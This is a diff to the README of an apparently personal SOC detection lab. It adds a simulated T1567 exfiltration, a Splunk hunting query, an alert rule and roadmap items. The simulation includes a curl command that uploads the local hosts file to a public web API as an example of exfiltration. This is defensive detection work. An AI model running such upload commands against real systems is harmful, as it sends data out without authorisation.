@@ -65,9 +65,9 @@ soc-detection-lab/
 - ✅ **Phase 3 — Telemetry Ingestion**
   Deployed Splunk Universal Forwarder, configured `inputs.conf` to forward Application/Security/System/Sysmon logs. Validated pipeline end-to-end in Splunk (`index=main`).
 
-- 🔄 **Phase 4 — Threat Simulation** *(in progress — 4 techniques simulated so far)*
+- 🔄 **Phase 4 — Threat Simulation** *(in progress — 5 techniques simulated so far)*
 
-- 🔄 **Phase 5 — Detection Engineering** *(in progress — 4 custom alerts so far)*
+- 🔄 **Phase 5 — Detection Engineering** *(in progress — 5 custom alerts so far)*
 
 - ⏳ **Phase 6 — Dashboards & Screenshots** *(planned)*
 
@@ -120,6 +120,18 @@ Invoke-AtomicTest T1560.001
 
 ---
 
+**Technique simulated:** T1567 — Exfiltration Over Web Service
+
+Simulated an attacker exfiltrating a sensitive local file (`hosts`) by uploading it directly to a public third-party web API rather than to attacker-controlled infrastructure — a technique real attackers use to blend exfiltration traffic in with legitimate HTTPS/API traffic:
+
+```powershell
+curl.exe -F "file=@C:\Windows\System32\drivers\etc\hosts" https://reqres.in/api/users
+```
+
+This closes out the attack chain simulated so far: **Execution → Credential Access → Persistence → Collection → Exfiltration.**
+
+---
+
 ## 🔍 Detection Engineering
 
 **Threat hunting query — PowerShell execution (SPL):**
@@ -165,12 +177,20 @@ index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCo
 | table _time, Image, CommandLine
 ```
 
+**Threat hunting query — exfiltration via web upload (SPL):**
+
+```spl
+index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=1 OR EventCode=3) (Image="*curl.exe" OR Image="*powershell.exe")
+| table _time, host, EventCode, Image, CommandLine, DestinationIp, DestinationPort
+```
+
 | Rule | Technique | Trigger | Severity | Action |
 |---|---|---|---|---|
 | Suspicious Obfuscated PowerShell Execution | T1059.001 | `Number of Results > 0` | High / Critical | Dashboard notification + event tagging |
 | Suspicious LSASS Memory Access | T1003.001 | `Number of Results > 0` | Critical | Dashboard notification + event tagging |
 | Suspicious Local Account / Group Manipulation | T1136.001 | `Number of Results > 0` | High | Dashboard notification + event tagging |
 | Suspicious Archive Utility Usage (Data Staging) | T1560.001 | `Number of Results > 0` | Medium | Dashboard notification + event tagging |
+| Suspicious Outbound File Upload (Exfiltration) | T1567 | `Number of Results > 0` | High | Dashboard notification + event tagging |
 
 ---
 
@@ -181,6 +201,7 @@ index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCo
 - LSASS credential dumping doesn't always show up as a clean process name — tools like `xordump` or `rdrleakdiag` are used to evade signature-based detection, so hunting on process access patterns (Sysmon EventCode 10, `TargetImage=lsass.exe`) is more resilient than blocking by filename alone.
 - Local account creation via `net user` is a fast, low-noise way for an attacker to establish persistence — pairing the command-line string with `localgroup` catches both the account creation and the follow-up privilege escalation (adding the new account to an admin group).
 - Data staging via archive utilities (7-Zip, WinRAR, WinZip, makecab) is a common precursor to exfiltration — because attackers can use any of several tools for the same goal, the detection needs to match on the *behavior* (compressing files into an archive) across multiple binaries rather than a single process name.
+- Exfiltrating over a legitimate public web API (rather than attacker-owned infrastructure) is a realistic evasion technique — the traffic looks like normal HTTPS to an API endpoint, so detection has to rely on process-level context (an unusual process like `curl.exe` making an outbound connection, carrying a local file as form data) rather than domain reputation alone.
 - *(More findings will be added as more techniques are tested.)*
 
 ---
@@ -190,11 +211,15 @@ index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCo
 - [x] Simulate a credential access technique (T1003.001)
 - [x] Simulate a persistence technique (T1136.001)
 - [x] Simulate a collection technique (T1560.001)
+- [x] Simulate an exfiltration technique (T1567) — completes a full attack chain
+- [ ] Build a correlation rule that fires when multiple attack-chain stages occur on the same host in a short window
 - [ ] Simulate additional MITRE ATT&CK techniques (lateral movement, defense evasion, privilege escalation)
 - [ ] Write 5–10 custom detection rules covering multiple tactics
+- [ ] Generate a MITRE ATT&CK Navigator heatmap of techniques covered
 - [ ] Build a Splunk dashboard for alert overview / MITRE coverage
 - [ ] Capture real screenshots of alerts and dashboards
 - [ ] Write 2–3 incident reports from real alert data (timeline, root cause, containment, lessons learned)
+- [ ] Add a dedicated attacker machine (Kali) to the lab network for realistic network-based attacks
 
 ---
 
